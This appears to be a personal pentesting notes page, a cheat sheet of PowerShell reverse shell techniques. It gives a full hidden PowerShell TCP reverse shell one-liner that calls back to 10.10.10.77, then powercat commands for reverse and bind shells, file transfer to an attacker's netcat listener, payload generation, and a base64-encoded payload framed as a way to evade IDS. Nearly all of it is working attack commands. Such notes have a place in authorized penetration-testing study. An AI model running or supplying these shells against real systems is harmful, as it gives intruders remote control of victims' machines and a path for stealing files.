---
description: >-
  Powershell Reverse Shell
title:  Powershell Reverse Shell             # Add title here
date: 2022-08-30 08:00:00 -0600                           # Change the date to match completion date
categories: [07 Persistence, Powershell Reverse Shell]                     # Change Templates to Writeup
tags: [persistence, powershell, reverse shell]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---

### Reverse Shell
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.77",);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Powercat
It is a script we can download to a Windows host to leverage the strengths of PowerShell and simplifies the creation of bind/reverse shells

The script is under /usr/share/windows-resources/powercat.
Initialize the script (once uploaded)
```powershell
PS C:\Users\Offsec> . .\powercat.ps1
```
Once uploaded
We can execute powercat as follows:
```
PS C:\Users\offsec> powercat
You must select either client mode (-c) or listen mode (-l).
```

### Reverse shell:
```powershell
powercat -c <attacker_ip> -p <port> -e cmd.exe
```

### Bind shell:
```powershell
powercat -l -p 443 -e cmd.exe
```

### File Transfer:
By first opening a port with netcat:
```bash
sudo nc -lnvp 443 > receiving_powercat.ps1
```
Then with -i flag choose the file path:
```powershell
powercat -c <attacker_ip> -p <port> -e cmd.exe -i C\Windows\Privesc\revershell.ps1
```

### Stand-Alone Payload
You can redirect the output of powercat, then save it into a file and execute such file as a powershell script with the -g flag:
```powershell
powercat -c <attacker_ip> -p <port) -e cmd.exe -g > revershell.ps1
```

### Encoded version (could ... but unlikely, evade IDS):
First create the file with -ge flag:
```powershell
powercat -c <attacker_ip> -p <port> -e cmd.exe -ge > revershell.ps1
```
In order to run the payload run the -E flag:
```powershell
powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzACkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAsACQAdAAgAD0AIAAkAEYAdQBuAGMAUwBlAHQAdQBwAFYAYQByAHMACgAgACAAIAAgAGkAZgAoACQAZwBsAG8AYgBhAGwAOgBWAGUAcgBiAG8AcwBlACkAewAkAFYAZQByAGIAbwBzAGUAIAA9ACAAJABUAHIAdQBlAH0ACgAgACAAIAAgACQARgB1AG4AYwBWAGEAcgBzACAAPQAgAEAAewB9AAoAIAAgACAAIABpAGYAKAAhACQAbAApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAJABGAHUAbgBjAFYAYQByAHMAWwAiAGwAIgBdACAAPQAgACQARgBhAGwAcwBlAAoAIAAgACAAIAAgACAAJABTAG8AYwBrAGUAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAKACAAIAAgACA
```



